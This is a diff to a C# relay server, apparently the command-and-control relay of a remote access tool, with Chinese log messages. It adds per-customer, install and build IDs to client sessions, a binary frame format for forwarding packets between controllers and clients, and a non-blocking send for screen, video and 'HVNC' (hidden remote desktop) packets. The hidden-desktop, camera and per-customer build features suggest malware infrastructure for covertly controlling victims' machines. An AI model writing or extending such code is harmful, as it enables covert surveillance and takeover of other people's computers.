@@ -235,7 +235,12 @@ namespace RemoteControl.Relay
             session.CameraStatus = handshake.CameraStatus;
             session.OnlineTime = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
 
-            string clientId = session.SessionId;
+            session.ClientId = string.IsNullOrEmpty(handshake.ClientId) ? session.SessionId : handshake.ClientId;
+            session.CustomerId = handshake.CustomerId;
+            session.InstallId = handshake.InstallId;
+            session.BuildId = handshake.BuildId;
+
+            string clientId = session.ClientId;
             _clients[clientId] = session;
             Console.WriteLine($"[上线] 客户端: {session.HostName} ({session.RemoteEndPoint}) ID={clientId}");
 
@@ -250,7 +255,15 @@ namespace RemoteControl.Relay
 
                     if (session.BoundController != null && session.BoundController.IsConnected)
                     {
-                        session.BoundController.SendRaw(packet);
+                        var relayPacket = PacketCodec.BuildRelayDataFrame(clientId, packet);
+                        if (PacketCodec.IsDroppableRealtimePacket(packet))
+                        {
+                            session.BoundController.TrySendRaw(relayPacket);
+                        }
+                        else
+                        {
+                            session.BoundController.SendRaw(relayPacket);
+                        }
                     }
                 }
             }
@@ -293,6 +306,21 @@ namespace RemoteControl.Relay
                             Console.WriteLine($"[绑定] 控制端{controllerId} -> 客户端{selectData.ClientId}");
                         }
                     }
+                    else if (packetType == 206 || packetType == 207)
+                    {
+                        var frame = PacketCodec.DecodeRelayDataFrame(packet);
+                        if (frame != null &&
+                            !string.IsNullOrEmpty(frame.ClientId) &&
+                            _clients.TryGetValue(frame.ClientId, out var targetClient) &&
+                            targetClient.IsConnected)
+                        {
+                            targetClient.BoundController = session;
+                            if (frame.Payload != null && frame.Payload.Length > 0)
+                            {
+                                targetClient.SendRaw(frame.Payload);
+                            }
+                        }
+                    }
                     else
                     {
                         if (session.BoundClient != null && session.BoundClient.IsConnected)
@@ -308,6 +336,13 @@ namespace RemoteControl.Relay
             if (session.BoundClient != null)
             {
                 session.BoundClient.BoundController = null;
+            }
+            foreach (var kv in _clients)
+            {
+                if (kv.Value.BoundController == session)
+                {
+                    kv.Value.BoundController = null;
+                }
             }
             Console.WriteLine($"[断开] 控制端: {controllerId}");
             session.Close();
@@ -384,6 +419,10 @@ namespace RemoteControl.Relay
         private object _sendLock = new object();
 
         public string SessionId { get; private set; }
+        public string ClientId { get; set; }
+        public string CustomerId { get; set; } = "";
+        public string InstallId { get; set; } = "";
+        public string BuildId { get; set; } = "";
         public string Role { get; set; } = "";
         public string HostName { get; set; } = "";
         public string AppPath { get; set; } = "";
@@ -412,6 +451,7 @@ namespace RemoteControl.Relay
         {
             _socket = socket;
             SessionId = Guid.NewGuid().ToString("N").Substring(0, 8);
+            ClientId = SessionId;
             RemoteEndPoint = socket.RemoteEndPoint?.ToString() ?? "unknown";
         }
 
@@ -470,6 +510,35 @@ namespace RemoteControl.Relay
             }
         }
 
+        public bool TrySendRaw(byte[] packet)
+        {
+            bool lockTaken = false;
+            try
+            {
+                System.Threading.Monitor.TryEnter(_sendLock, ref lockTaken);
+                if (!lockTaken)
+                    return false;
+
+                int sent = 0;
+                while (sent < packet.Length)
+                {
+                    int s = _socket.Send(packet, sent, packet.Length - sent, SocketFlags.None);
+                    if (s <= 0) break;
+                    sent += s;
+                }
+                return true;
+            }
+            catch
+            {
+                return false;
+            }
+            finally
+            {
+                if (lockTaken)
+                    System.Threading.Monitor.Exit(_sendLock);
+            }
+        }
+
         public void Close()
         {
             try { _socket?.Shutdown(SocketShutdown.Both); } catch { }
@@ -491,6 +560,10 @@ namespace RemoteControl.Relay
     public class HandshakeData
     {
         public string Role { get; set; } = "";
+        public string ClientId { get; set; } = "";
+        public string CustomerId { get; set; } = "";
+        public string InstallId { get; set; } = "";
+        public string BuildId { get; set; } = "";
         public string HostName { get; set; } = "";
         public string AppPath { get; set; } = "";
         public string OnlineAvatar { get; set; } = "";
@@ -506,6 +579,16 @@ namespace RemoteControl.Relay
         public string ClientId { get; set; } = "";
     }
 
+    public class RelayDataFrameData
+    {
+        public string ClientId { get; set; } = "";
+        public string SessionId { get; set; } = "";
+        public string RequestId { get; set; } = "";
+        public int StreamId { get; set; }
+        public int InnerPacketType { get; set; }
+        public byte[] Payload { get; set; } = new byte[0];
+    }
+
     public static class PacketCodec
     {
         const byte CYCLER_RELAY_HANDSHAKE = 200;
@@ -514,11 +597,25 @@ namespace RemoteControl.Relay
         const byte CYCLER_RELAY_SELECT_CLIENT = 203;
         const byte CYCLER_RELAY_CLIENT_ONLINE = 204;
         const byte CYCLER_RELAY_CLIENT_OFFLINE = 205;
+        const byte CYCLER_RELAY_FORWARD = 206;
+        const byte CYCLER_RELAY_CLIENT_DATA = 207;
+        const byte PACKET_START_CAPTURE_SCREEN_RESPONSE = 6;
+        const byte PACKET_START_CAPTURE_VIDEO_RESPONSE = 9;
+        const byte PACKET_HVNC_SCREEN_RESPONSE = 111;
+        static readonly byte[] RelayFrameMagic = Encoding.ASCII.GetBytes("RCF1");
 
         public static byte GetPacketType(byte[] fullPacket)
         {
             if (fullPacket == null || fullPacket.Length < 5) return 0;
             return fullPacket[4];
+        }
+
+        public static bool IsDroppableRealtimePacket(byte[] fullPacket)
+        {
+            byte packetType = GetPacketType(fullPacket);
+            return packetType == PACKET_START_CAPTURE_SCREEN_RESPONSE ||
+                packetType == PACKET_START_CAPTURE_VIDEO_RESPONSE ||
+                packetType == PACKET_HVNC_SCREEN_RESPONSE;
         }
 
         private static string GetBodyJson(byte[] fullPacket)
@@ -564,6 +661,119 @@ namespace RemoteControl.Relay
             catch { return null; }
         }
 
+        public static RelayDataFrameData DecodeRelayDataFrame(byte[] fullPacket)
+        {
+            byte type = GetPacketType(fullPacket);
+            if (type != CYCLER_RELAY_FORWARD && type != CYCLER_RELAY_CLIENT_DATA)
+                return null;
+
+            RelayDataFrameData binaryFrame;
+            if (TryDecodeRelayDataFrameBinary(fullPacket, out binaryFrame))
+                return binaryFrame;
+
+            string json = GetBodyJson(fullPacket);
+            if (string.IsNullOrEmpty(json)) return null;
+            try { return JsonConvert.DeserializeObject<RelayDataFrameData>(json); }
+            catch { return null; }
+        }
+
+        public static byte[] BuildRelayDataFrame(string clientId, byte[] payload)
+        {
+            var frame = new RelayDataFrameData();
+            frame.ClientId = clientId ?? "";
+            frame.InnerPacketType = GetPacketType(payload);
+            frame.Payload = payload ?? new byte[0];
+            return BuildRelayDataFramePacket(CYCLER_RELAY_FORWARD, frame);
+        }
+
+        private static bool TryDecodeRelayDataFrameBinary(byte[] fullPacket, out RelayDataFrameData frame)
+        {
+            frame = null;
+            if (fullPacket == null || fullPacket.Length < 5 + RelayFrameMagic.Length)
+                return false;
+
+            int offset = 5;
+            for (int i = 0; i < RelayFrameMagic.Length; i++)
+            {
+                if (fullPacket[offset + i] != RelayFrameMagic[i])
+                    return false;
+            }
+
+            offset += RelayFrameMagic.Length;
+            frame = new RelayDataFrameData();
+            frame.StreamId = ReadInt(fullPacket, ref offset);
+            frame.InnerPacketType = ReadInt(fullPacket, ref offset);
+            int clientIdLength = ReadInt(fullPacket, ref offset);
+            int sessionIdLength = ReadInt(fullPacket, ref offset);
+            int requestIdLength = ReadInt(fullPacket, ref offset);
+            int payloadLength = ReadInt(fullPacket, ref offset);
+            frame.ClientId = ReadString(fullPacket, ref offset, clientIdLength);
+            frame.SessionId = ReadString(fullPacket, ref offset, sessionIdLength);
+            frame.RequestId = ReadString(fullPacket, ref offset, requestIdLength);
+            frame.Payload = ReadBytes(fullPacket, ref offset, payloadLength);
+            return true;
+        }
+
+        private static byte[] BuildRelayDataFramePacket(byte packetType, RelayDataFrameData frame)
+        {
+            byte[] clientId = Encoding.UTF8.GetBytes(frame.ClientId ?? string.Empty);
+            byte[] sessionId = Encoding.UTF8.GetBytes(frame.SessionId ?? string.Empty);
+            byte[] requestId = Encoding.UTF8.GetBytes(frame.RequestId ?? string.Empty);
+            byte[] payload = frame.Payload ?? new byte[0];
+
+            var body = new List<byte>(RelayFrameMagic.Length + 24 +
+                clientId.Length + sessionId.Length + requestId.Length + payload.Length);
+            body.AddRange(RelayFrameMagic);
+            AddInt(body, frame.StreamId);
+            AddInt(body, frame.InnerPacketType);
+            AddInt(body, clientId.Length);
+            AddInt(body, sessionId.Length);
+            AddInt(body, requestId.Length);
+            AddInt(body, payload.Length);
+            body.AddRange(clientId);
+            body.AddRange(sessionId);
+            body.AddRange(requestId);
+            body.AddRange(payload);
+
+            int packetLength = 4 + 1 + body.Count;
+            byte[] packet = new byte[packetLength];
+            Buffer.BlockCopy(BitConverter.GetBytes(packetLength), 0, packet, 0, 4);
+            packet[4] = packetType;
+            body.CopyTo(packet, 5);
+            return packet;
+        }
+
+        private static void AddInt(List<byte> bytes, int value)
+        {
+            bytes.AddRange(BitConverter.GetBytes(value));
+        }
+
+        private static int ReadInt(byte[] bytes, ref int offset)
+        {
+            int value = BitConverter.ToInt32(bytes, offset);
+            offset += 4;
+            return value;
+        }
+
+        private static string ReadString(byte[] bytes, ref int offset, int length)
+        {
+            if (length <= 0)
+                return string.Empty;
+            string value = Encoding.UTF8.GetString(bytes, offset, length);
+            offset += length;
+            return value;
+        }
+
+        private static byte[] ReadBytes(byte[] bytes, ref int offset, int length)
+        {
+            if (length <= 0)
+                return new byte[0];
+            byte[] value = new byte[length];
+            Buffer.BlockCopy(bytes, offset, value, 0, length);
+            offset += length;
+            return value;
+        }
+
         public static byte[] BuildClientListResponse(ConcurrentDictionary<string, ClientSession> clients)
         {
             var list = new List<object>();
@@ -572,7 +782,7 @@ namespace RemoteControl.Relay
                 var s = kv.Value;
                 list.Add(new
                 {
-                    ClientId = s.SessionId,
+                    ClientId = s.ClientId,
                     HostName = s.HostName,
                     IP = s.RemoteEndPoint,
                     AppPath = s.AppPath,
@@ -592,7 +802,7 @@ namespace RemoteControl.Relay
         {
             return BuildPacket(CYCLER_RELAY_CLIENT_ONLINE, new
             {
-                ClientId = client.SessionId,
+                ClientId = client.ClientId,
                 HostName = client.HostName,
                 IP = client.RemoteEndPoint,
                 OnlineAvatar = client.OnlineAvatar,
